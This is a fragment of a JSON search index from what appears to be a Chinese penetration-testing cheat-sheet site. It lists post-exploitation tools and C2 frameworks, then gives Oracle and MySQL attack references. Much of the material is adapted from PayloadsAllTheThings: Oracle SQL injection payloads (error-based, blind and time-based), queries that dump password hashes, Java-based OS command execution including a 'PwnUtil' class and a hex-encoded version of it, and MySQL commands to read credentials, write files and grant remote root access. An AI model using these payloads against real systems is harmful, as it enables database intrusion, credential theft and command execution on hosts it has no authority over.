https://github.com/fortra/impacket","title":"\u540e\u6e17\u900f\u5de5\u5177\u5217\u8868"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/#_1","text":"","title":"\u540e\u6e17\u900f\u5de5\u5177\u5217\u8868"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/#f8x","text":"\u4e00\u6b3e\u7ea2/\u84dd\u961f\u73af\u5883\u81ea\u52a8\u5316\u90e8\u7f72\u5de5\u5177,\u652f\u6301\u591a\u79cd\u573a\u666f,\u6e17\u900f,\u5f00\u53d1,\u4ee3\u7406\u73af\u5883,\u670d\u52a1\u53ef\u9009\u9879\u7b49 \u9879\u76ee\u5730\u5740\uff1a https://github.com/ffffffff0x/f8x \u4e2d\u6587\u6587\u6863\uff1a https://github.com/ffffffff0x/f8x/blob/main/README.zh-cn.md","title":"f8x"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/#supershell","text":"Supershell C2 \u8fdc\u63a7\u5e73\u53f0\uff0c\u57fa\u4e8e\u53cd\u5411SSH\u96a7\u9053\u83b7\u53d6\u5b8c\u5168\u4ea4\u4e92\u5f0fShell \u9879\u76ee\u5730\u5740\uff1a https://github.com/tdragon6/Supershell","title":"Supershell"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/#viper","text":"\u4e92\u8054\u7f51\u653b\u51fb\u9762\u7ba1\u7406&\u7ea2\u961f\u6a21\u62df\u5e73\u53f0 \u9879\u76ee\u5730\u5740\uff1a https://github.com/FunnyWolf/Viper \u5b89\u88c5 or \u4f7f\u7528\u624b\u518c\uff1a https://www.yuque.com/vipersec/install/olg1ua","title":"Viper"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/#sliver-c2","text":"Sliver C2 \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u8de8\u5e73\u53f0\u7ea2\u961f\u6846\u67b6\u3002 \u9879\u76ee\u5730\u5740\uff1a https://github.com/BishopFox/sliver \u7ea2\u961f\u5de5\u5177\u7814\u7a76\u7bc7 - Sliver C2","title":"Sliver C2"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/#impacket","text":"\u5185\u7f51\u6e17\u900f Python \u5de5\u5177\u5305 \u9879\u76ee\u5730\u5740\uff1a https://github.com/fortra/impacket","title":"Impacket"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/","text":"oracle \u76f8\u5173\u5de5\u5177\uff1a MDUT oracle\u67e5\u6700\u5927\u6570\u91cf\u8868 select t.table_name,t.tablespace_name,t.owner,t.num_rows from all_tables t ORDER BY NUM_ROWS DESC; select t.table_name,t.tablespace_name,t.owner,t.num_rows from all_tables t ORDER BY NUM_ROWS DESC; select t.table_name tableName, f.comments comments from user_tables t inner join user_tab_comments f on t.table_name = f.table_name \u67e5\u8be2\u5305\u542b user \u5b57\u6bb5\u5728\u54ea\u4e2a\u5e93\u54ea\u4e2a\u8868 SELECT owner AS database_name, table_name, column_name FROM all_tab_columns WHERE column_name LIKE '%USER%' ORDER BY owner, table_name, column_name; Oracle SQL \u9ed8\u8ba4\u6570\u636e\u5e93 Name Description SYSTEM \u9002\u7528\u4e8e\u6240\u6709\u7248\u672c SYSAUX \u9002\u7528\u4e8e\u6240\u6709\u7248\u672c Oracle SQL \u6ce8\u91ca Type Description -- - SQL comment Oracle SQL \u7248\u672c SELECT user FROM dual UNION SELECT * FROM v$version SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'; SELECT banner FROM v$version WHERE banner LIKE 'TNS%'; SELECT version FROM v$instance; Oracle SQL \u4e3b\u673a\u540d SELECT host_name FROM v$instance; (Privileged) SELECT UTL_INADDR.get_host_name FROM dual; SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; SELECT UTL_INADDR.get_host_address FROM dual; Oracle SQL \u6570\u636e\u5e93\u540d\u79f0 SELECT global_name FROM global_name; SELECT name FROM V$DATABASE; SELECT instance_name FROM V$INSTANCE; SELECT SYS.DATABASE_NAME FROM DUAL; Oracle SQL \u6570\u636e\u5e93\u51ed\u8bc1 SQL \u8bed\u53e5 \u63cf\u8ff0 SELECT username FROM all_users; \u9002\u7528\u4e8e\u6240\u6709\u7248\u672c SELECT name, password from sys.user$; Privileged, <= 10g SELECT name, spare4 from sys.user$; Privileged, <= 11g Oracle SQL \u5217\u51fa\u6570\u636e\u5e93 SELECT DISTINCT owner FROM all_tables; Oracle SQL \u5217\u51fa\u5217 SELECT column_name FROM all_tab_columns WHERE table_name = 'blah'; SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo'; Oracle SQL \u5217\u51fa\u8868 SELECT table_name FROM all_tables; SELECT owner, table_name FROM all_tables; SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%'; Oracle SQL \u62a5\u9519\u6ce8\u5165 Description Query Invalid HTTP Request SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual CTXSYS.DRITHSX.SN SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual Invalid XPath SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual Invalid XML SELECT to_char(dbms_xmlgen.getxml('select \"'&#124;&#124;(select user from sys.dual)&#124;&#124;'\" FROM sys.dual')) FROM dual Invalid XML SELECT rtrim(extract(xmlagg(xmlelement(\"s\", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users SQL Error SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) XDBURITYPE getblob XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob() XDBURITYPE getclob XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob() When the injection point is inside a string use : '||PAYLOAD-- Oracle SQL \u76f2\u6ce8 Description Query Version is 12.2 SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%'; Subselect is enabled SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual) Table log_table exists SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table); Column message exists in table log_table SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; First letter of first message is t SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%'; Oracle SQL \u65f6\u95f4\u6ce8\u5165 AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) Oracle SQL \u547d\u4ee4\u6267\u884c ODAT (Oracle Database Attacking Tool) Oracle Java Execution List Java privileges sql select * from dba_java_policy select * from user_java_policy Grant privileges sql exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute'); exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', ''); exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', ''); Execute commands 10g R2, 11g R1 and R2: DBMS_JAVA_TEST.FUNCALL() sql SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe','/c', 'dir >c:\\test.txt') FROM DUAL SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual 11g R1 and R2: DBMS_JAVA.RUNJAVA() sql SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL Oracle Java Class /* create Java class */ BEGIN EXECUTE IMMEDIATE 'create or replace and compile java source named \"PwnUtil\" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};'; END; / BEGIN EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';'; END; / /* run OS command */ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual; or (hex encoded) /* create Java class */ SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d'')); EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual /* run OS command */ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual; References \u6ce8\uff1a\u5927\u90e8\u5206\u5185\u5bb9\u7ffb\u8bd1\u81f3\uff1a https://github.com/swisskyrepo/PayloadsAllTheThings NetSpi - SQL Wiki ASDC12 - New and Improved Hacking Oracle From Web - OWASP Pentesting Oracle TNS Listener - HackTricks ODAT: Oracle Database Attacking Tool - quentinhardy WebSec CheatSheet - Oracle New payload to exploit Error-based SQL injection - Oracle database - Mannu Linux - 12/09/2023 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md","title":"oracle"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle","text":"\u76f8\u5173\u5de5\u5177\uff1a MDUT","title":"oracle"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle_1","text":"select t.table_name,t.tablespace_name,t.owner,t.num_rows from all_tables t ORDER BY NUM_ROWS DESC; select t.table_name,t.tablespace_name,t.owner,t.num_rows from all_tables t ORDER BY NUM_ROWS DESC; select t.table_name tableName, f.comments comments from user_tables t inner join user_tab_comments f on t.table_name = f.table_name","title":"oracle\u67e5\u6700\u5927\u6570\u91cf\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#user","text":"SELECT owner AS database_name, table_name, column_name FROM all_tab_columns WHERE column_name LIKE '%USER%' ORDER BY owner, table_name, column_name;","title":"\u67e5\u8be2\u5305\u542b user \u5b57\u6bb5\u5728\u54ea\u4e2a\u5e93\u54ea\u4e2a\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql","text":"Name Description SYSTEM \u9002\u7528\u4e8e\u6240\u6709\u7248\u672c SYSAUX \u9002\u7528\u4e8e\u6240\u6709\u7248\u672c","title":"Oracle SQL \u9ed8\u8ba4\u6570\u636e\u5e93"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_1","text":"Type Description -- - SQL comment","title":"Oracle SQL \u6ce8\u91ca"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_2","text":"SELECT user FROM dual UNION SELECT * FROM v$version SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'; SELECT banner FROM v$version WHERE banner LIKE 'TNS%'; SELECT version FROM v$instance;","title":"Oracle SQL \u7248\u672c"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_3","text":"SELECT host_name FROM v$instance; (Privileged) SELECT UTL_INADDR.get_host_name FROM dual; SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; SELECT UTL_INADDR.get_host_address FROM dual;","title":"Oracle SQL \u4e3b\u673a\u540d"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_4","text":"SELECT global_name FROM global_name; SELECT name FROM V$DATABASE; SELECT instance_name FROM V$INSTANCE; SELECT SYS.DATABASE_NAME FROM DUAL;","title":"Oracle SQL \u6570\u636e\u5e93\u540d\u79f0"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_5","text":"SQL \u8bed\u53e5 \u63cf\u8ff0 SELECT username FROM all_users; \u9002\u7528\u4e8e\u6240\u6709\u7248\u672c SELECT name, password from sys.user$; Privileged, <= 10g SELECT name, spare4 from sys.user$; Privileged, <= 11g","title":"Oracle SQL \u6570\u636e\u5e93\u51ed\u8bc1"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_6","text":"SELECT DISTINCT owner FROM all_tables;","title":"Oracle SQL \u5217\u51fa\u6570\u636e\u5e93"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_7","text":"SELECT column_name FROM all_tab_columns WHERE table_name = 'blah'; SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';","title":"Oracle SQL \u5217\u51fa\u5217"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_8","text":"SELECT table_name FROM all_tables; SELECT owner, table_name FROM all_tables; SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';","title":"Oracle SQL \u5217\u51fa\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_9","text":"Description Query Invalid HTTP Request SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual CTXSYS.DRITHSX.SN SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual Invalid XPath SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual Invalid XML SELECT to_char(dbms_xmlgen.getxml('select \"'&#124;&#124;(select user from sys.dual)&#124;&#124;'\" FROM sys.dual')) FROM dual Invalid XML SELECT rtrim(extract(xmlagg(xmlelement(\"s\", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users SQL Error SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) XDBURITYPE getblob XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob() XDBURITYPE getclob XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob() When the injection point is inside a string use : '||PAYLOAD--","title":"Oracle SQL \u62a5\u9519\u6ce8\u5165"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_10","text":"Description Query Version is 12.2 SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%'; Subselect is enabled SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual) Table log_table exists SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table); Column message exists in table log_table SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; First letter of first message is t SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';","title":"Oracle SQL \u76f2\u6ce8"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_11","text":"AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])","title":"Oracle SQL \u65f6\u95f4\u6ce8\u5165"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_12","text":"ODAT (Oracle Database Attacking Tool)","title":"Oracle SQL \u547d\u4ee4\u6267\u884c"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-java-execution","text":"List Java privileges sql select * from dba_java_policy select * from user_java_policy Grant privileges sql exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute'); exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', ''); exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', ''); Execute commands 10g R2, 11g R1 and R2: DBMS_JAVA_TEST.FUNCALL() sql SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe','/c', 'dir >c:\\test.txt') FROM DUAL SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual 11g R1 and R2: DBMS_JAVA.RUNJAVA() sql SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL","title":"Oracle Java Execution"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-java-class","text":"/* create Java class */ BEGIN EXECUTE IMMEDIATE 'create or replace and compile java source named \"PwnUtil\" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};'; END; / BEGIN EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';'; END; / /* run OS command */ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual; or (hex encoded) /* create Java class */ SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d'')); EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual /* run OS command */ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;","title":"Oracle Java Class"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#references","text":"\u6ce8\uff1a\u5927\u90e8\u5206\u5185\u5bb9\u7ffb\u8bd1\u81f3\uff1a https://github.com/swisskyrepo/PayloadsAllTheThings NetSpi - SQL Wiki ASDC12 - New and Improved Hacking Oracle From Web - OWASP Pentesting Oracle TNS Listener - HackTricks ODAT: Oracle Database Attacking Tool - quentinhardy WebSec CheatSheet - Oracle New payload to exploit Error-based SQL injection - Oracle database - Mannu Linux - 12/09/2023 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md","title":"References"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/","text":"mysql mysql \u67e5\u8fde\u63a5 IP SELECT * FROM performance_schema.hosts; show full processlist; mysql \u67e5\u6700\u5927\u6570\u91cf\u8868 select table_name,table_rows,table_schema,table_comment from information_schema.tables order by table_rows desc; \u67e5\u8be2 user \u5b57\u6bb5\u5728\u54ea\u4e2a\u5e93\u54ea\u4e2a\u8868 SELECT TABLE_SCHEMA AS database_name, TABLE_NAME AS table_name, COLUMN_NAME AS column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%user%'; \u7edf\u8ba1\u8bbf\u95ee\u8fc7\u7684\u8868\u6b21\u6570 //\u5e93\u540d,\u8868\u540d,\u8bbf\u95ee\u6b21\u6570 select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc; \u67e5\u770b\u5199\u5165\u6743\u9650 mysql> show global variables like '%secure%'; +------------------+-------+ | Variable_name | Value | +------------------+-------+ | secure_auth | ON | | secure_file_priv | | \u53ef\u5199\u5165 | secure_file_priv | NULL | \u4e0d\u53ef\u5199\u5165 +------------------+-------+ SHOW VARIABLES LIKE \"secure_file_priv\"; NULL\uff0c\u8868\u793a\u7981\u6b62\u3002 \u5982\u679cvalue\u503c\u6709\u6587\u4ef6\u5939\u76ee\u5f55\uff0c\u5219\u8868\u793a\u53ea\u5141\u8bb8\u8be5\u76ee\u5f55\u4e0b\u6587\u4ef6\uff0c\u6d4b\u8bd5\u5b50\u76ee\u5f55\u4e5f\u4e0d\u884c\u3002 \u5982\u679c\u4e3a\u7a7a\uff0c\u5219\u8868\u793a\u4e0d\u9650\u5236\u76ee\u5f55\u3002 \u4e0d\u767b\u5f55\u6267\u884c sql mysql -uaHmin -proot test -e \"select now()\" -N >H:/work/target1.txt mysql -uroot -e \"show databases;\" >1.txt \u57fa\u7840\u547d\u4ee4 \u663e\u793a\u7248\u672c: select version(); \u663e\u793a\u5b57\u7b26\u96c6: select @@character_set_database; \u663e\u793a\u6570\u636e\u5e93: show databases; \u663e\u793a\u8868\u540d: show tables; \u663e\u793a\u5b57\u6bb5: show columns from table_name; \u663e\u793a\u8ba1\u7b97\u673a\u540d: select @@hostname; \u7cfb\u7edf\u7248\u672c: select @@version_compile_os; mysql\u8def\u5f84: select @@basedir; \u6570\u636e\u5e93\u8def\u5f84: select @@datadir; describe describe table_name; \u663e\u793aroot\u5bc6\u7801: select User,Password from mysql.user; \u5bfc\u5165\u6587\u4ef6: select load_fie(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C); \u5bfc\u51fa\u6587\u4ef6: select 'testtest' into outfile '/var/www/html/test.txt' from mysql.user; \u5f00\u542f\u5916\u8fde: GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION; mysql\u5b89\u88c5\u8def\u5f84: show variables; \u66f4\u65b0\u6570\u636e\u5e93: UPDATE `DX15`.`dx15_common_member` SET `uid` = '1' WHERE `dx15_common_member`.`uid` =40407;\u66f4\u65b040407uid\u53d8\u6210uid1 mysql\u66f4\u6539root\u5bc6\u7801: mysqladmin -u root password \"newpwd\"; \u67e5\u8be2\u8868: select concat(User,0x3a,Password) from mysql.user; \u83b7\u53d6\u6570\u636e\u5e93\u6240\u6709\u8868: SHOW TABLES FROM `databases`; \u83b7\u53d6\u5217\u524d20\u884c: SELECT * FROM `admin_bbs` ORDER BY 1 DESC LIMIT 0,20; \u83b7\u53d6\u8868\u884c\u6570: SELECT COUNT(*) AS CNT FROM `dede_admin`;","title":"mysql"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#mysql","text":"","title":"mysql"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#mysql-ip","text":"SELECT * FROM performance_schema.hosts; show full processlist;","title":"mysql \u67e5\u8fde\u63a5 IP"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#mysql_1","text":"select table_name,table_rows,table_schema,table_comment from information_schema.tables order by table_rows desc;","title":"mysql \u67e5\u6700\u5927\u6570\u91cf\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#user","text":"SELECT TABLE_SCHEMA AS database_name, TABLE_NAME AS table_name, COLUMN_NAME AS column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%user%';","title":"\u67e5\u8be2 user \u5b57\u6bb5\u5728\u54ea\u4e2a\u5e93\u54ea\u4e2a\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#_1","text":"//\u5e93\u540d,\u8868\u540d,\u8bbf\u95ee\u6b21\u6570 select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;","title":"\u7edf\u8ba1\u8bbf\u95ee\u8fc7\u7684\u8868\u6b21\u6570"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#_2","text":"mysql> show global variables like '%secure%'; +------------------+-------+ | Variable_name | Value | +------------------+-------+ | secure_auth | ON | | secure_file_priv | | \u53ef\u5199\u5165 | secure_file_priv | NULL | \u4e0d\u53ef\u5199\u5165 +------------------+-------+ SHOW VARIABLES LIKE \"secure_file_priv\"; NULL\uff0c\u8868\u793a\u7981\u6b62\u3002 \u5982\u679cvalue\u503c\u6709\u6587\u4ef6\u5939\u76ee\u5f55\uff0c\u5219\u8868\u793a\u53ea\u5141\u8bb8\u8be5\u76ee\u5f55\u4e0b\u6587\u4ef6\uff0c\u6d4b\u8bd5\u5b50\u76ee\u5f55\u4e5f\u4e0d\u884c\u3002 \u5982\u679c\u4e3a\u7a7a\uff0c\u5219\u8868\u793a\u4e0d\u9650\u5236\u76ee\u5f55\u3002","title":"\u67e5\u770b\u5199\u5165\u6743\u9650"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#sql","text":"mysql -uaHmin -proot test -e \"select now()\" -N 